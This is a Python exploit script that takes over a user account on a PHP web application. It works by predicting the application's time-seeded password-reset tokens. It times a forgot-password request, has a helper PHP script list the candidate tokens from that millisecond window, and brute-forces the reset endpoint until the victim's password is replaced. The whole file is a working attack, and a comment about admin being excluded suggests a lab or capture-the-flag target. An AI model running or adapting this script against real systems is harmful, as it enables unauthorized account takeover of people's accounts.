#!/usr/bin/env python3
import requests, sys, subprocess, time

SENT_MARKER    = "Email sent!"
SUCCESS_MARKER = "Password changed!"

def collect_tokens(ts_lower, ts_upper):
    out = subprocess.check_output(["php", "generateToken.php", str(ts_lower), str(ts_upper)])
    return [t for t in out.decode().strip().split("\n") if t]

def rest_password(sess, target_url, tokens, new_password):
    total = len(tokens)
    for i, tok in enumerate(tokens, 1):
        r = sess.post(f"{target_url}/resetpassword.php",
                      data={"token": tok, "password1": new_password, "password2": new_password},
                      timeout=15)
        sys.stdout.write(f"\r[*] done {i}/{total} | remaining {total - i}   ")
        sys.stdout.flush()
        if SUCCESS_MARKER in r.text:          # stop the instant it works
            print()
            return tok
    print()
    return None

def main():
    if len(sys.argv) < 4:
        print(f"Usage: python3 {sys.argv[0]} <target_url> <target_user> <new_password>")
        sys.exit(1)

    target_url   = sys.argv[1].rstrip("/")
    target_user  = sys.argv[2]
    new_password = sys.argv[3]

    sess = requests.Session()                 # one kept-alive connection for the whole run

    # 1) WARM UP: the first hit pays PHP/Apache cold-start and bloats the seed window.
    #    Burn it here so the timed request below is fast -> far fewer candidate tokens.
    try:
        sess.get(f"{target_url}/index.php", timeout=15)
        sess.post(f"{target_url}/forgotpassword.php", data={"username": target_user}, timeout=15)
    except requests.RequestException:
        pass

    # 2) TIMED request -- now warm, so the window is tight
    ts_lower = int(time.time() * 1000)
    r = sess.post(f"{target_url}/forgotpassword.php", data={"username": target_user}, timeout=15)
    ts_upper = int(time.time() * 1000)

    if SENT_MARKER not in r.text:             # precondition
        print(f"[-] Precondition failed: no '{SENT_MARKER}'. User missing or blocked (admin is excluded).")
        sys.exit(1)

    tokens = collect_tokens(ts_lower, ts_upper)
    print(f"[*] Reset requested for {target_user}")
    print(f"[*] Seed window = {ts_upper - ts_lower} ms  ->  {len(tokens)} candidate tokens\n")

    start = time.time()
    token = rest_password(sess, target_url, tokens, new_password)
    elapsed = time.time() - start

    if token:
        print(f"[+] SUCCESS in {elapsed:.1f}s -- {target_user}'s password is now '{new_password}'")
        print(f"[+] Winning token: {token}")
    else:
        print(f"[-] FAILED after {elapsed:.1f}s -- no match in this window.")

if __name__ == "__main__":
    main()
